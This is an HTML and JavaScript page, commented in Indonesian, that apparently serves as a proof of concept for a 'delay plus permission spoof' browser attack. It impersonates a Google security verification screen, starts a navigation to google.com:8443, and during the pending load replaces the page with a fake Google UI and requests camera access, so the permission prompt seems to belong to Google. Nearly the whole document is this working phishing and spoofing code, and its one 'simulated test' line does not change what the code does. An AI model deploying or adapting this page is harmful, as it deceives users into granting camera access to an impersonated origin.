<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Security Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #4285f4; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
  button:hover { background: #1557b0; }
  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Google Security Verification</h2>
  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan kamera untuk verifikasi.</p>
  <button id="startBtn">Verify Account & Allow Camera</button>
  <div id="status">[*] Ready...</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var btn = document.getElementById('startBtn');
  var statusEl = document.getElementById('status');

  function log(msg) {
    statusEl.textContent = msg;
    console.log("[Delay+Permission Spoof] " + msg);
  }

  // ============================================
  // 1. TRIGGER (KLIK)
  // ============================================
  btn.addEventListener('click', function() {
    log("[*] Memulai delay + permission spoofing...");

    // ============================================
    // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
    // ============================================
    try {
      window.location.href = "https://www.google.com:8443";
    } catch (e) {
      log("[-] Redirect error: " + e.message);
    }

    // ============================================
    // 3. SELAMA DELAY, TAMPILKAN UI PALSU + MINTA IZIN KAMERA
    // ============================================
    setTimeout(function() {
      log("[*] Meminta Izin Kamera (saat pending navigation)...");
      
      // A. Tampilkan UI palsu
      document.body.innerHTML = `
        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
          <h2 style="color:#333;margin-bottom:10px;">Google Security Verification</h2>
          <p style="color:#666;font-size:14px;margin-bottom:20px;">Silakan izinkan kamera untuk melanjutkan verifikasi.</p>
          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Izinkan Kamera</button>
          <div style="margin-top:15px;font-size:11px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
        </div>
      `;

      // B. Minta izin kamera
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
        .then(function(stream) {
          log("[+] Kamera DIIZINKAN!");
          stream.getTracks().forEach(function(t) { t.stop(); });
          
          document.body.innerHTML = `
            <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
              <h2 style="color:#34a853;">✅ Verifikasi Berhasil</h2>
              <p style="color:#666;">Kamera telah diizinkan. Anda akan diarahkan ke Google.</p>
            </div>
          `;
          
          setTimeout(function() {
            window.location.replace('https://www.google.com');
          }, 2000);
        })
        .catch(function(err) {
          log("[-] Kamera ditolak: " + err.name);
          setTimeout(function() {
            window.location.replace('https://www.google.com');
          }, 1000);
        });

      // C. Tangkap klik tombol palsu (jika user mengklik)
      document.getElementById('spoofLogin').addEventListener('click', function() {
        log("[!] User clicked FAKE Allow button.");
        // Prompt kamera asli sudah dipicu di atas
      });

    }, 1000); // 1 detik setelah redirect (saat pending)

  }, { once: true });

})();
</script>

</body>
</html>
